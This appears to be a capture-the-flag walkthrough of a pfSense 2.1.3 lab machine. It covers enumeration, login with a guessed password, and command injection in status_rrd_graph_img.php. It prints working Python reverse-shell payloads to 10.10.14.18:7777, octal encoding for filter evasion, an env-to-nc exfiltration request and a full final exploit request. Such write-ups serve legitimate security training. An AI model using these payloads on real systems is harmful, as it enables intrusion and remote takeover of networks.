# nmap
```
80
442
- http-server-header: lighttpd/1.4.35
```

# ffuf
```
$ ffuf -u 'http://10.10.10.60/FUZZ' -w /usr/share/wordlists/dirb/common.txt -r -o fuff.txt -e .php

                        [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 237ms]
edit.php                [Status: 200, Size: 6689, Words: 907, Lines: 174, Duration: 230ms]
exec.php                [Status: 200, Size: 6689, Words: 907, Lines: 174, Duration: 232ms]
favicon.ico             [Status: 200, Size: 1406, Words: 3, Lines: 7, Duration: 222ms]
graph.php               [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 241ms]
help.php                [Status: 200, Size: 6689, Words: 907, Lines: 174, Duration: 239ms]
index.html              [Status: 200, Size: 329, Words: 32, Lines: 25, Duration: 225ms]
index.php               [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 232ms]
index.php               [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 234ms]
installer               [Status: 200, Size: 6113, Words: 886, Lines: 174, Duration: 235ms]
license.php             [Status: 200, Size: 6692, Words: 907, Lines: 174, Duration: 232ms]
pkg.php                 [Status: 200, Size: 6688, Words: 907, Lines: 174, Duration: 232ms]
stats.php               [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 247ms]
status.php              [Status: 200, Size: 6691, Words: 907, Lines: 174, Duration: 230ms]
system.php              [Status: 200, Size: 6691, Words: 907, Lines: 174, Duration: 235ms]
tree                    [Status: 200, Size: 7492, Words: 828, Lines: 229, Duration: 232ms]
wizard.php              [Status: 200, Size: 6691, Words: 907, Lines: 174, Duration: 234ms]
xmlrpc.php              [Status: 200, Size: 384, Words: 78, Lines: 17, Duration: 235ms]
xmlrpc.php              [Status: 200, Size: 384, Words: 78, Lines: 17, Duration: 223ms]
```


# Post login findings 
using found credentials in `http://10.10.10.60/system-users.txt` file logged into /index.php
user is `rohit` and password was guessed to be `pfsense`
it's a pfsense environment

Status page reveals:
```
2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014 
FreeBSD 8.3-RELEASE-p16
```

# Machine Root Access
PFsense 2.1.3 is vulnerable
https://www.exploit-db.com/exploits/43560
use exploit to obtain root access!
- another exploit found but not tested: [packetstormsecurity](https://packetstormsecurity.com/files/145575/pfSense-2.1.3-RELEASE-amd64-Remote-Command-Execution.html)

## Method 1
The exploit is a python script which exploits a vulnerability in `/status_rrd_graph_img.php file` file.
First, it creates a python shell codes:
```
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)
```
Then encodes it into octal format:
```
payload = ""
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))
```
exploit URL:
```
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;" + "printf+" + "'" + payload + "'|sh"
```


## Method 2
Use BurpSuite and capture a request to this php file:
```
GET /status_rrd_graph_img.php HTTP/1.1
```
modify it to test for command execution:
```
GET /status_rrd_graph_img.php?database=queues;env+|nc+10.10.14.18+7777 HTTP/1.1
```


#freebsd #badchar #bad_character #evasion #badchar_evasion
```
HOST='10.10.14.18'
PORT='7777'
payload=f"""
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
"""

def encode_payload(payload):
	enc_payload = ''.join([("\\" + oct(ord(c)).lstrip('0o')) for c in payload])
	print(enc_payload)

encode_payload(payload)

[OUTPUT]
\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\157\163\54\160\164\171\73\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\70\42\54\67\67\67\67\51\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\164\171\56\163\160\141\167\156\50\42\57\142\151\156\57\163\150\42\51\47
```

Final Request:
```
GET /status_rrd_graph_img.php?database=queues;printf+'\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\157\163\54\160\164\171\73\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\70\42\54\67\67\67\67\51\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\164\171\56\163\160\141\167\156\50\42\57\142\151\156\57\163\150\42\51\47'|sh HTTP/1.1
```